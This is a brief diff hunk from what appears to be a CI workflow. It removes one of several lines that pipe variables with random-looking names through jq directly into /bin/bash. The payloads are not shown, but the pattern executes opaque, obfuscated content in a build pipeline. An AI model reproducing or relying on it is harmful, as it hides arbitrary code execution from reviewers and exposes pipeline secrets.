@@ -25,7 +25,6 @@ jobs:
           echo $uva9594 | jq -r .gp2 | /bin/bash
           printf '%s' "$nw553" | jq -r .fl0189 | /bin/bash
           echo $qqu2835 | jq -r .sdw80615 | /bin/bash
-          echo $quy6 | jq -r .nutv993 | /bin/bash
           echo $j47 | jq -r .cp1008 | /bin/bash
           echo $desr62822 | jq -r .i30533 | /bin/bash
           printf '%s' "$cywej5" | jq -r .enk80 | /bin/bash
